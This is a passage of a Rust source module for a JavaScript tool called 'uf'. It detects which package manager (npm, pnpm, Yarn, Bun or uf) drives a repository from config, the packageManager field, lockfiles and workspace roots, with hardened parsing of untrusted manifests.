//! Package manager auto-inference for repositories that already use npm, pnpm, yarn, or bun.
//!
//! `uf` ships its own resolver ([`crate::PackageResolver::UfNative`]), but it must
//! *interoperate* with existing projects instead of forcing a migration.
//! [`detect_package_manager`] inspects a directory and reports which manager drives
//! it, the evidence that decided it, and every competing candidate so the CLI can
//! warn instead of silently guessing.
//!
//! # Precedence
//!
//! Highest wins; every loser is kept in [`Detection::alternatives`].
//!
//! | Rank | [`DetectionSource`] | Evidence |
//! | ---- | ------------------- | -------- |
//! | 1 | [`DetectionSource::ConfigOverride`] | `pm.packageManager` in `uf.config.js` |
//! | 2 | [`DetectionSource::PackageManagerField`] | `"packageManager"` in `<root>/package.json` |
//! | 3 | [`DetectionSource::Lockfile`] | a lockfile in `<root>` itself |
//! | 4 | [`DetectionSource::WorkspaceRoot`] | evidence in the nearest ancestor workspace root |
//! | 5 | [`DetectionSource::Default`] | [`PackageManager::Uf`] |
//!
//! Lockfiles are ranked against each other by [`Lockfile`] declaration order
//! (`uf.lock` > `bun.lock` > `bun.lockb` > `pnpm-lock.yaml` > `yarn.lock` >
//! `package-lock.json` > `npm-shrinkwrap.json`). When lockfiles naming *different*
//! managers sit side by side the tie-break is still deterministic, but
//! [`Detection::outcome`] reports [`DetectionOutcome::Ambiguous`] with every
//! conflicting lockfile so the choice is never silent.
//!
//! # Security
//!
//! Everything read here is attacker-controlled repository content:
//!
//! * The `"packageManager"` field is validated by a hand-written single-pass
//!   scanner rather than a backtracking regex, because regex engines over manifest
//!   text are a well-known ReDoS CVE class.
//! * Rejected fields never reach a process: [`crate::Invocation::program`] is a
//!   `&'static str` from a fixed table, so a hostile manifest cannot inject a
//!   program name or an argument.
//! * `__proto__`, `constructor`, and `prototype` keys are ignored wherever a JSON
//!   map is walked.
//! * Manifests larger than [`DetectionOptions::max_manifest_bytes`] are refused
//!   instead of being buffered.
//! * The ancestor walk is depth-bounded, stops at a `.git` directory, never
//!   follows a symlink, and never leaves [`DetectionOptions::boundary`].

use std::fmt;
use std::fs;
use std::io::Read;

use camino::{Utf8Component, Utf8Path, Utf8PathBuf};
use compact_str::{CompactString, ToCompactString};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use smallvec::SmallVec;
use thiserror::Error;
use uf_config::{PackageManagerPreference, UniflowedConfig};

use crate::is_polluting_json_key;

/// Largest `package.json` uf will parse while detecting a package manager.
///
/// Manifests above this bound are reported as [`DetectionIssue::ManifestTooLarge`]
/// instead of being buffered, so a hostile repository cannot force an unbounded
/// allocation.
pub const MAX_MANIFEST_BYTES: u64 = 4 * 1024 * 1024;

/// Largest number of ancestor directories inspected while looking for a workspace root.
pub const MAX_ANCESTOR_DEPTH: usize = 64;

/// Largest `"packageManager"` field uf will parse.
pub const MAX_PACKAGE_MANAGER_FIELD_BYTES: usize = 128;

/// Bytes read from `yarn.lock` when classifying the Yarn edition.
const YARN_LOCK_PROBE_BYTES: usize = 8 * 1024;

/// Inline candidate list; real projects carry at most a handful of lockfiles.
pub type DetectionCandidates = SmallVec<[DetectionCandidate; 4]>;

/// Inline diagnostic list emitted while reading untrusted project files.
pub type DetectionIssues = SmallVec<[DetectionIssue; 2]>;

/// Inline lockfile list for a single directory.
pub type LockfileList = SmallVec<[Lockfile; 4]>;

/// Package manager that can drive a JavaScript project.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(into = "CompactString", try_from = "CompactString")]
pub enum PackageManager {
    /// uf's own resolver, backed by `uf.lock` and the content-addressed `.uf/store`.
    Uf,
    /// npm.
    Npm,
    /// pnpm.
    Pnpm,
    /// Yarn, in the edition the project pins.
    Yarn(YarnEdition),
    /// Bun.
    Bun,
}

/// Yarn major-line, which changes both the lockfile format and the CLI flags.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum YarnEdition {
    /// Yarn 1.x, "classic".
    Classic,
    /// Yarn 2 and newer, "berry".
    Berry,
}

impl PackageManager {
    /// Every package manager uf can drive, in detection precedence order.
    pub const ALL: [Self; 6] = [
        Self::Uf,
        Self::Bun,
        Self::Pnpm,
        Self::Yarn(YarnEdition::Berry),
        Self::Yarn(YarnEdition::Classic),
        Self::Npm,
    ];

    /// Stable identifier used in JSON output, CLI text, and config values.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Uf => "uf",
            Self::Npm => "npm",
            Self::Pnpm => "pnpm",
            Self::Yarn(YarnEdition::Classic) => "yarn-classic",
            Self::Yarn(YarnEdition::Berry) => "yarn-berry",
            Self::Bun => "bun",
        }
    }

    /// Parse a manager identifier.
    ///
    /// Bare `yarn` selects [`YarnEdition::Berry`], matching modern Yarn releases;
    /// `yarn-classic` pins Yarn 1.x.
    #[must_use]
    pub fn parse(value: &str) -> Option<Self> {
        match value {
            "uf" => Some(Self::Uf),
            "npm" => Some(Self::Npm),
            "pnpm" => Some(Self::Pnpm),
            "yarn" | "yarn-berry" => Some(Self::Yarn(YarnEdition::Berry)),
            "yarn-classic" => Some(Self::Yarn(YarnEdition::Classic)),
            "bun" => Some(Self::Bun),
            _ => None,
        }
    }

    /// Map a `uf.config.js` preference onto a manager, or `None` for `auto`.
    #[must_use]
    pub const fn from_preference(preference: PackageManagerPreference) -> Option<Self> {
        match preference {
            PackageManagerPreference::Auto => None,
            PackageManagerPreference::Uf => Some(Self::Uf),
            PackageManagerPreference::Npm => Some(Self::Npm),
            PackageManagerPreference::Pnpm => Some(Self::Pnpm),
            PackageManagerPreference::Yarn | PackageManagerPreference::YarnBerry => {
                Some(Self::Yarn(YarnEdition::Berry))
            }
            PackageManagerPreference::YarnClassic => Some(Self::Yarn(YarnEdition::Classic)),
            PackageManagerPreference::Bun => Some(Self::Bun),
        }
    }

    /// Lockfile this manager writes.
    #[must_use]
    pub const fn lockfile(self) -> Lockfile {
        match self {
            Self::Uf => Lockfile::UfLock,
            Self::Npm => Lockfile::PackageLock,
            Self::Pnpm => Lockfile::PnpmLock,
            Self::Yarn(_) => Lockfile::YarnLock,
            Self::Bun => Lockfile::BunLock,
        }
    }
}

impl fmt::Display for PackageManager {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(self.as_str())
    }
}

impl From<PackageManager> for CompactString {
    fn from(manager: PackageManager) -> Self {
        Self::const_new(manager.as_str())
    }
}

/// Rejection returned when a string does not name a package manager uf can drive.
#[derive(Debug, Clone, PartialEq, Eq, Error)]
#[error("`{name}` is not one of uf, npm, pnpm, yarn, yarn-classic, yarn-berry, bun")]
pub struct UnknownPackageManager {
    /// The rejected identifier.
    pub name: CompactString,
}

impl TryFrom<CompactString> for PackageManager {
    type Error = UnknownPackageManager;

    fn try_from(value: CompactString) -> Result<Self, Self::Error> {
        Self::parse(value.as_str()).ok_or(UnknownPackageManager { name: value })
    }
}

/// Lockfile uf recognises, in detection precedence order.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Lockfile {
    /// `uf.lock`.
    UfLock,
    /// `bun.lock`, Bun's textual lockfile.
    BunLock,
    /// `bun.lockb`, Bun's binary lockfile.
    BunLockb,
    /// `pnpm-lock.yaml`.
    PnpmLock,
    /// `yarn.lock`, written by both Yarn editions.
    YarnLock,
    /// `package-lock.json`.
    PackageLock,
    /// `npm-shrinkwrap.json`.
    NpmShrinkwrap,
}

impl Lockfile {
    /// Every recognised lockfile, in precedence order.
    pub const ALL: [Self; 7] = [
        Self::UfLock,
        Self::BunLock,
        Self::BunLockb,
        Self::PnpmLock,
        Self::YarnLock,
        Self::PackageLock,
        Self::NpmShrinkwrap,
    ];

    /// File name on disk.
    #[must_use]
    pub const fn file_name(self) -> &'static str {
        match self {
            Self::UfLock => "uf.lock",
            Self::BunLock => "bun.lock",
            Self::BunLockb => "bun.lockb",
            Self::PnpmLock => "pnpm-lock.yaml",
            Self::YarnLock => "yarn.lock",
            Self::PackageLock => "package-lock.json",
            Self::NpmShrinkwrap => "npm-shrinkwrap.json",
        }
    }

    /// Package manager that writes this lockfile.
    ///
    /// `yarn.lock` reports [`YarnEdition::Classic`] because the edition is only
    /// known after probing the lockfile header and `.yarnrc.yml`; detection
    /// refines it through [`yarn_edition_in`].
    #[must_use]
    pub const fn manager(self) -> PackageManager {
        match self {
            Self::UfLock => PackageManager::Uf,
            Self::BunLock | Self::BunLockb => PackageManager::Bun,
            Self::PnpmLock => PackageManager::Pnpm,
            Self::YarnLock => PackageManager::Yarn(YarnEdition::Classic),
            Self::PackageLock | Self::NpmShrinkwrap => PackageManager::Npm,
        }
    }
}

impl fmt::Display for Lockfile {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(self.file_name())
    }
}

/// Marker that identifies a directory as a workspace root.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum WorkspaceMarker {
    /// A lockfile lived in the ancestor directory.
    Lockfile(Lockfile),
    /// The ancestor directory held `pnpm-workspace.yaml`.
    PnpmWorkspaceYaml,
    /// The ancestor's `package.json` declared a `"workspaces"` field.
    PackageJsonWorkspaces,
}

/// Semantic version parsed out of a `"packageManager"` field.
///
/// Deliberately not ordered: comparing prerelease segments correctly is a semver
/// concern uf does not need here, and a derived ordering would be wrong.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Version {
    /// Major component.
    pub major: u32,
    /// Minor component.
    pub minor: u32,
    /// Patch component.
    pub patch: u32,
    /// Prerelease segment without its leading `-`, when present.
    pub prerelease: Option<CompactString>,
}

impl fmt::Display for Version {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(formatter, "{}.{}.{}", self.major, self.minor, self.patch)?;
        if let Some(prerelease) = &self.prerelease {
            write!(formatter, "-{prerelease}")?;
        }
        Ok(())
    }
}

/// Validated `"packageManager"` field, in corepack's `name@version[+integrity]` shape.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PackageManagerSpec {
    /// Manager named by the field.
    pub manager: PackageManager,
    /// Version pinned by the field.
    pub version: Version,
    /// Corepack integrity suffix without its leading `+`, when present.
    pub integrity: Option<CompactString>,
}

/// Typed rejection for an invalid `"packageManager"` manifest field.
///
/// The field is attacker-controlled, so every rejection is structured: nothing is
/// echoed into a shell and nothing unvalidated ever reaches an [`crate::Invocation`].
#[derive(Debug, Clone, PartialEq, Eq, Error, Serialize, Deserialize)]
#[serde(
    tag = "kind",
    rename_all = "kebab-case",
    rename_all_fields = "camelCase"
)]
pub enum PackageManagerFieldError {
    /// The field was present but empty.
    #[error("packageManager field is empty")]
    Empty,
    /// The field was longer than [`MAX_PACKAGE_MANAGER_FIELD_BYTES`].
    #[error("packageManager field is {length} bytes; the limit is {limit}")]
    TooLong {
        /// Length of the rejected field.
        length: usize,
        /// Accepted limit.
        limit: usize,
    },
    /// The field carried no `@` separating the name from the version.
    #[error("packageManager field is missing the `name@version` separator")]
    MissingSeparator,
    /// The name was not one of `npm`, `pnpm`, `yarn`, `bun`.
    #[error("packageManager name `{name}` is not one of npm, pnpm, yarn, bun")]
    UnknownManager {
        /// Rejected manager name.
        name: CompactString,
    },
    /// The version was not `major.minor.patch`.
    #[error("packageManager version `{version}` is not a major.minor.patch version")]
    MalformedVersion {
        /// Rejected version text.
        version: CompactString,
    },
    /// A numeric version component did not fit in a `u32`.
    #[error("packageManager version component `{component}` overflows a 32-bit integer")]
    VersionOverflow {
        /// Rejected component text.
        component: CompactString,
    },
    /// A byte outside the accepted alphabet appeared in the field.
    #[error("packageManager field has the forbidden character `{character}` at byte {offset}")]
    ForbiddenCharacter {
        /// The offending character.
        character: char,
        /// Byte offset of the character within the field.
        offset: usize,
    },
}

/// Evidence that decided which package manager drives a project.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(
    tag = "kind",
    rename_all = "kebab-case",
    rename_all_fields = "camelCase"
)]
pub enum DetectionSource {
    /// `pm.packageManager` in `uf.config.js` named the manager explicitly.
    ConfigOverride,
    /// A `"packageManager"` field in `package.json` named the manager.
    PackageManagerField {
        /// Manifest that declared the field.
        manifest: Utf8PathBuf,
        /// Parsed and validated field value.
        spec: PackageManagerSpec,
    },
    /// A lockfile in the starting directory named the manager.
    Lockfile {
        /// Lockfile that decided the manager.
        lockfile: Lockfile,
        /// Path of that lockfile.
        path: Utf8PathBuf,
    },
    /// Evidence was inherited from the nearest ancestor workspace root.
    WorkspaceRoot {
        /// Ancestor directory that owns the workspace.
        root: Utf8PathBuf,
        /// Marker that identified the ancestor as a workspace root.
        marker: WorkspaceMarker,
    },
    /// No evidence at all; uf's native manager is the default.
    Default,
}

impl DetectionSource {
    /// Stable identifier for the source kind, matching the emitted JSON tag.
    #[must_use]
    pub const fn kind(&self) -> &'static str {
        match self {
            Self::ConfigOverride => "config-override",
            Self::PackageManagerField { .. } => "package-manager-field",
            Self::Lockfile { .. } => "lockfile",
            Self::WorkspaceRoot { .. } => "workspace-root",
            Self::Default => "default",
        }
    }
}

/// A package manager candidate backed by one piece of evidence.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DetectionCandidate {
    /// Manager the evidence points at.
    pub package_manager: PackageManager,
    /// The evidence itself.
    pub source: DetectionSource,
}

/// Whether the winning evidence was unique.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(
    tag = "kind",
    rename_all = "kebab-case",
    rename_all_fields = "camelCase"
)]
pub enum DetectionOutcome {
    /// Exactly one manager was evidenced at the deciding precedence level.
    Unambiguous,
    /// Lockfiles naming different managers sat side by side in one directory.
    ///
    /// [`Detection::manager`] still holds the deterministic tie-break so callers
    /// keep working, but the conflict is reported rather than hidden.
    Ambiguous {
        /// Every conflicting lockfile, in precedence order.
        lockfiles: LockfileList,
    },
}

/// Non-fatal problem found while reading untrusted project files.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(
    tag = "kind",
    rename_all = "kebab-case",
    rename_all_fields = "camelCase"
)]
pub enum DetectionIssue {
    /// A `"packageManager"` field was present but rejected.
    InvalidPackageManagerField {
        /// Manifest that declared the field.
        manifest: Utf8PathBuf,
        /// Typed rejection reason.
        error: PackageManagerFieldError,
    },
    /// A manifest was larger than the parse cap and was skipped.
    ManifestTooLarge {
        /// Manifest that was skipped.
        manifest: Utf8PathBuf,
        /// Size of the manifest in bytes.
        bytes: u64,
        /// Accepted limit in bytes.
        limit: u64,
    },
    /// A manifest existed but could not be used.
    ManifestUnusable {
        /// Manifest that was skipped.
        manifest: Utf8PathBuf,
        /// Why the manifest was skipped.
        fault: ManifestFault,
    },
    /// A manifest declared a prototype-pollution key, which was ignored.
    PollutingManifestKey {
        /// Manifest that declared the key.
        manifest: Utf8PathBuf,
        /// The ignored key.
        key: CompactString,
    },
    /// The ancestor walk hit [`DetectionOptions::max_ancestors`] before finishing.
    AncestorLimitReached {
        /// The limit that was reached.
        limit: usize,
    },
    /// The starting directory was outside the supplied boundary, so nothing was read.
    OutsideBoundary {
        /// Starting directory, lexically normalised.
        path: Utf8PathBuf,
        /// Boundary the walk may never leave.
        boundary: Utf8PathBuf,
    },
}

/// Why a manifest could not be consulted.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ManifestFault {
    /// The file could not be read.
    Unreadable,
    /// The file was not valid JSON, or was not a JSON object.
    InvalidJson,
    /// The path was not a regular file; uf never follows a symlinked manifest.
    NotARegularFile,
}

/// Result of inferring which package manager drives a project.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Detection {
    /// Directory detection started from, lexically normalised.
    pub root: Utf8PathBuf,
    /// Package manager that drives the project.
    pub package_manager: PackageManager,
    /// Evidence that decided [`Detection::package_manager`].
    pub source: DetectionSource,
    /// Whether the deciding evidence was unique.
    pub outcome: DetectionOutcome,
    /// Every candidate that lost, in precedence order.
    pub alternatives: DetectionCandidates,
    /// Problems found while reading untrusted project files.
    pub issues: DetectionIssues,
}

impl Detection {
    /// Return whether lockfiles naming different managers sat side by side.
    #[must_use]
    pub const fn is_ambiguous(&self) -> bool {
        matches!(self.outcome, DetectionOutcome::Ambiguous { .. })
    }

    /// Return whether uf's own resolver drives the project.
    #[must_use]
    pub const fn is_uf_native(&self) -> bool {
        matches!(self.package_manager, PackageManager::Uf)
    }
}

/// Knobs for [`detect_package_manager_with`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct DetectionOptions<'a> {
    /// Explicit `pm.packageManager` override from `uf.config.js`.
    pub config_override: Option<PackageManager>,
    /// Directory the walk may never leave; no path outside it is ever read.
    pub boundary: Option<&'a Utf8Path>,
    /// Maximum number of ancestor directories inspected.
    pub max_ancestors: usize,
    /// Maximum manifest size parsed, in bytes.
    pub max_manifest_bytes: u64,
}

impl Default for DetectionOptions<'_> {
    fn default() -> Self {
        Self {
            config_override: None,
            boundary: None,
            max_ancestors: MAX_ANCESTOR_DEPTH,
            max_manifest_bytes: MAX_MANIFEST_BYTES,
        }
    }
}

impl<'a> DetectionOptions<'a> {
    /// Build options with uf's defaults.
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// Build options from `uf.config.js`, honouring `pm.packageManager`.
    #[must_use]
    pub fn from_config(config: &UniflowedConfig) -> DetectionOptions<'static> {
        DetectionOptions {
            config_override: PackageManager::from_preference(config.pm.package_manager),
            ..DetectionOptions::default()
        }
    }

    /// Refuse to read anything outside `boundary`.
    #[must_use]
    pub fn with_boundary(mut self, boundary: &'a Utf8Path) -> Self {
        self.boundary = Some(boundary);
        self
    }

    /// Pin an explicit manager, as `pm.packageManager` does.
    #[must_use]
    pub fn with_config_override(mut self, manager: PackageManager) -> Self {
        self.config_override = Some(manager);
        self
    }

    /// Bound the ancestor walk.
    #[must_use]
    pub fn with_max_ancestors(mut self, max_ancestors: usize) -> Self {
        self.max_ancestors = max_ancestors;
        self
    }

    /// Bound the manifest size that will be parsed.
    #[must_use]
    pub fn with_max_manifest_bytes(mut self, max_manifest_bytes: u64) -> Self {
        self.max_manifest_bytes = max_manifest_bytes;
        self
    }
}

/// Infer which package manager drives the project rooted at `root`.
///
/// Detection never fails: with no evidence it falls back to
/// [`PackageManager::Uf`], recording anything suspicious in
/// [`Detection::issues`]. See the [module docs](self) for the precedence table.
#[must_use]
pub fn detect_package_manager(root: &Utf8Path) -> Detection {
    detect_package_manager_with(root, &DetectionOptions::default())
}

/// Infer which package manager drives `root` with explicit options.
#[must_use]
pub fn detect_package_manager_with(root: &Utf8Path, options: &DetectionOptions<'_>) -> Detection {
    let start = lexically_normalized(root);
    let mut issues = DetectionIssues::new();

    if let Some(boundary) = options.boundary {
        let boundary = lexically_normalized(boundary);
        if !start.starts_with(&boundary) {
            issues.push(DetectionIssue::OutsideBoundary {
                path: start.clone(),
                boundary,
            });
            return Detection {
                root: start,
                package_manager: PackageManager::Uf,
                source: DetectionSource::Default,
                outcome: DetectionOutcome::Unambiguous,
                alternatives: DetectionCandidates::new(),
                issues,
            };
        }
    }

    let mut candidates = DetectionCandidates::new();

    if let Some(manager) = options.config_override {
        candidates.push(DetectionCandidate {
            package_manager: manager,
            source: DetectionSource::ConfigOverride,
        });
    }

    let manifest_path = start.join("package.json");
    let manifest = read_manifest(&manifest_path, options, &mut issues);
    if let Some(spec) = manifest
        .as_ref()
        .and_then(|value| manifest_package_manager(&manifest_path, value, &mut issues))
    {
        candidates.push(DetectionCandidate {
            package_manager: spec.manager,
            source: DetectionSource::PackageManagerField {
                manifest: manifest_path,
                spec,
            },
        });
    }

    let local_lockfiles = scan_lockfiles(&start);
    let local_managers = managers_for(&start, &local_lockfiles);
    for (lockfile, manager) in local_lockfiles.iter().zip(local_managers.iter()) {
        candidates.push(DetectionCandidate {
            package_manager: *manager,
            source: DetectionSource::Lockfile {
                lockfile: *lockfile,
                path: start.join(lockfile.file_name()),
            },
        });
    }

    let ancestor = find_workspace_root(&start, options, &mut issues);
    if let Some(found) = &ancestor
        && let Some(manager) = found.manager
    {
        candidates.push(DetectionCandidate {
            package_manager: manager,
            source: DetectionSource::WorkspaceRoot {
                root: found.root.clone(),
                marker: found.marker,
            },
        });
    }

    let mut candidates = candidates.into_iter();
    let winner = candidates.next().unwrap_or(DetectionCandidate {
        package_manager: PackageManager::Uf,
        source: DetectionSource::Default,
    });
    let alternatives = candidates.collect::<DetectionCandidates>();

    let outcome = match &winner.source {
        DetectionSource::Lockfile { .. } => ambiguity(&local_lockfiles, &local_managers),
        DetectionSource::WorkspaceRoot {
            marker: WorkspaceMarker::Lockfile(_),
            ..
        } => ancestor
            .as_ref()
            .map_or(DetectionOutcome::Unambiguous, |found| {
                ambiguity(&found.lockfiles, &found.managers)
            }),
        _ => DetectionOutcome::Unambiguous,
    };

    Detection {
        root: start,
        package_manager: winner.package_manager,
        source: winner.source,
        outcome,
        alternatives,
        issues,
    }
}

/// Parse and validate a corepack-style `"packageManager"` field.
///
/// The accepted shape is
/// `^(npm|pnpm|yarn|bun)@\d+\.\d+\.\d+(-[0-9A-Za-z.-]+)?(\+[0-9A-Za-z.-]+)?$`,
/// implemented as a single forward pass with no backtracking. A regex engine here
/// would be a ReDoS foothold on attacker-supplied manifest text (the CVE class of
/// `ansi-regex` CVE-2021-3807 and `semver` CVE-2022-25883), so the grammar is
/// hand-written and every byte is visited at most once.
///
/// # Errors
///
/// Returns [`PackageManagerFieldError`] describing exactly why the field was
/// refused. `uf` is intentionally not accepted: the field is corepack's, and uf
/// projects pin their manager through `uf.config.js`.
pub fn parse_package_manager_field(
    value: &str,
) -> Result<PackageManagerSpec, PackageManagerFieldError> {
    if value.is_empty() {
        return Err(PackageManagerFieldError::Empty);
    }
    if value.len() > MAX_PACKAGE_MANAGER_FIELD_BYTES {
        return Err(PackageManagerFieldError::TooLong {
            length: value.len(),
            limit: MAX_PACKAGE_MANAGER_FIELD_BYTES,
        });
    }

    let bytes = value.as_bytes();
    let Some(separator) = bytes.iter().position(|byte| *byte == b'@') else {
        return Err(PackageManagerFieldError::MissingSeparator);
    };

    let name = &value[..separator];
    let manager = match name {
        "npm" => PackageManager::Npm,
        "pnpm" => PackageManager::Pnpm,
        "bun" => PackageManager::Bun,
        // The edition is decided by the pinned major once the version parses.
        "yarn" => PackageManager::Yarn(YarnEdition::Classic),
        _ => {
            return Err(PackageManagerFieldError::UnknownManager {
                name: name.to_compact_string(),
            });
        }
    };

    let mut cursor = separator + 1;
    let major = take_number(value, &mut cursor)?;
    expect_dot(value, &mut cursor)?;
    let minor = take_number(value, &mut cursor)?;
    expect_dot(value, &mut cursor)?;
    let patch = take_number(value, &mut cursor)?;

    let prerelease = if bytes.get(cursor) == Some(&b'-') {
        cursor += 1;
        Some(take_tagged_segment(value, &mut cursor)?)
    } else {
        None
    };

    let integrity = if bytes.get(cursor) == Some(&b'+') {
        cursor += 1;
        Some(take_tagged_segment(value, &mut cursor)?)
    } else {
        None
    };

    if cursor != bytes.len() {
        return Err(forbidden_character(value, cursor));
    }

    let manager = match manager {
        PackageManager::Yarn(_) if major >= 2 => PackageManager::Yarn(YarnEdition::Berry),
        other => other,
    };

    Ok(PackageManagerSpec {
        manager,
        version: Version {
            major,
            minor,
            patch,
            prerelease,
        },
        integrity,
    })
}

/// Classify the Yarn edition used by `dir`.
///
/// Berry writes a `__metadata:` header into `yarn.lock` and is the only edition
/// that reads `.yarnrc.yml`; anything else is treated as Yarn 1.x.
#[must_use]
pub fn yarn_edition_in(dir: &Utf8Path) -> YarnEdition {
    if is_regular_file(&dir.join(".yarnrc.yml")) {
        return YarnEdition::Berry;
    }

    let head = read_file_head(&dir.join("yarn.lock"), YARN_LOCK_PROBE_BYTES);
    let head = String::from_utf8_lossy(&head);
    if head.contains("__metadata:") {
        YarnEdition::Berry
    } else {
        YarnEdition::Classic
    }
}

/// Every lockfile present directly in `dir`, in precedence order.
#[must_use]
pub fn scan_lockfiles(dir: &Utf8Path) -> LockfileList {
    Lockfile::ALL
        .into_iter()
        .filter(|lockfile| is_regular_file(&dir.join(lockfile.file_name())))
        .collect()
}

#[derive(Debug)]
struct WorkspaceRootFind {
    root: Utf8PathBuf,
    marker: WorkspaceMarker,
    manager: Option<PackageManager>,
    lockfiles: LockfileList,
    managers: SmallVec<[PackageManager; 4]>,
}

fn find_workspace_root(
    start: &Utf8Path,
    options: &DetectionOptions<'_>,
    issues: &mut DetectionIssues,
) -> Option<WorkspaceRootFind> {
    let mut current = start.parent()?.to_path_buf();
    let mut visited = 0usize;

    loop {
        if visited >= options.max_ancestors {
            issues.push(DetectionIssue::AncestorLimitReached {
                limit: options.max_ancestors,
            });
            return None;
        }
        visited += 1;

        if let Some(boundary) = options.boundary
            && !current.starts_with(lexically_normalized(boundary))
        {
            return None;
        }

        let lockfiles = scan_lockfiles(&current);
        if let Some(lockfile) = lockfiles.first() {
            let managers = managers_for(&current, &lockfiles);
            let manager = managers.first().copied();
            return Some(WorkspaceRootFind {
                root: current,
                marker: WorkspaceMarker::Lockfile(*lockfile),
                manager,
                lockfiles,
                managers,
            });
        }

        if is_regular_file(&current.join("pnpm-workspace.yaml")) {
            return Some(WorkspaceRootFind {
                root: current,
                marker: WorkspaceMarker::PnpmWorkspaceYaml,
                manager: Some(PackageManager::Pnpm),
                lockfiles,
                managers: SmallVec::new(),
            });
        }

        let manifest_path = current.join("package.json");
        if let Some(manifest) = read_manifest(&manifest_path, options, issues)
            && manifest_has_workspaces(&manifest_path, &manifest, issues)
        {
            let manager = manifest_package_manager(&manifest_path, &manifest, issues)
                .map(|spec| spec.manager);
            return Some(WorkspaceRootFind {
                root: current,
                marker: WorkspaceMarker::PackageJsonWorkspaces,
                manager,
                lockfiles,
                managers: SmallVec::new(),
            });
        }

        // A `.git` directory ends the repository; a workspace never spans past it.
        if current.join(".git").exists() {
            return None;
        }

        current = current.parent()?.to_path_buf();
    }
}

fn managers_for(dir: &Utf8Path, lockfiles: &LockfileList) -> SmallVec<[PackageManager; 4]> {
    let yarn = lockfiles
        .contains(&Lockfile::YarnLock)
        .then(|| yarn_edition_in(dir));

    lockfiles
        .iter()
        .map(|lockfile| match lockfile {
            Lockfile::YarnLock => PackageManager::Yarn(yarn.unwrap_or(YarnEdition::Classic)),
            other => other.manager(),
        })
        .collect()
}

fn ambiguity(lockfiles: &LockfileList, managers: &[PackageManager]) -> DetectionOutcome {
    let distinct = managers.first().is_some_and(|first| {
        managers
            .iter()
            .any(|manager| !same_family(*manager, *first))
    });

    if distinct {
        DetectionOutcome::Ambiguous {
            lockfiles: lockfiles.clone(),
        }
    } else {
        DetectionOutcome::Unambiguous
    }
}

/// `bun.lock` next to `bun.lockb` is one manager, not a conflict; so is a Yarn
/// lockfile whose edition probe is the only thing that differs.
fn same_family(left: PackageManager, right: PackageManager) -> bool {
    matches!(
        (left, right),
        (PackageManager::Yarn(_), PackageManager::Yarn(_))
    ) || left == right
}

fn read_manifest(
    path: &Utf8Path,
    options: &DetectionOptions<'_>,
    issues: &mut DetectionIssues,
) -> Option<Value> {
    let metadata = match fs::symlink_metadata(path) {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return None,
        Err(_) => {
            issues.push(DetectionIssue::ManifestUnusable {
                manifest: path.to_path_buf(),
                fault: ManifestFault::Unreadable,
            });
            return None;
        }
    };

    // `symlink_metadata` does not follow the final component, so a manifest that
    // points outside the tree is refused rather than read (symlink-escape guard).
    if !metadata.is_file() {
        issues.push(DetectionIssue::ManifestUnusable {
            manifest: path.to_path_buf(),
            fault: ManifestFault::NotARegularFile,
        });
        return None;
    }

    if metadata.len() > options.max_manifest_bytes {
        issues.push(DetectionIssue::ManifestTooLarge {
            manifest: path.to_path_buf(),
            bytes: metadata.len(),
            limit: options.max_manifest_bytes,
        });
        return None;
    }

    let Ok(source) = fs::read_to_string(path) else {
        issues.push(DetectionIssue::ManifestUnusable {
            manifest: path.to_path_buf(),
            fault: ManifestFault::Unreadable,
        });
        return None;
    };

    match serde_json::from_str::<Value>(&source) {
        Ok(value) if value.is_object() => Some(value),
        _ => {
            issues.push(DetectionIssue::ManifestUnusable {
                manifest: path.to_path_buf(),
                fault: ManifestFault::InvalidJson,
            });
            None
        }
    }
}

fn manifest_package_manager(
    path: &Utf8Path,
    manifest: &Value,
    issues: &mut DetectionIssues,
) -> Option<PackageManagerSpec> {
    report_polluting_keys(path, manifest, issues);

    let raw = manifest.get("packageManager")?.as_str()?;
    match parse_package_manager_field(raw) {
        Ok(spec) => Some(spec),
        Err(error) => {
            issues.push(DetectionIssue::InvalidPackageManagerField {
                manifest: path.to_path_buf(),
                error,
            });
            None
        }
    }
}

fn manifest_has_workspaces(
    path: &Utf8Path,
    manifest: &Value,
    issues: &mut DetectionIssues,
) -> bool {
    report_polluting_keys(path, manifest, issues);

    match manifest.get("workspaces") {
        Some(Value::Array(globs)) => !globs.is_empty(),
        // Yarn 1 also accepts `{ "packages": [...], "nohoist": [...] }`.
        Some(Value::Object(object)) => object
            .iter()
            .filter(|(key, _)| !is_polluting_json_key(key))
            .any(|(key, value)| {
                key == "packages" && value.as_array().is_some_and(|globs| !globs.is_empty())
            }),
        _ => false,
    }
}

/// Record and ignore prototype-pollution keys declared at the manifest root.
///
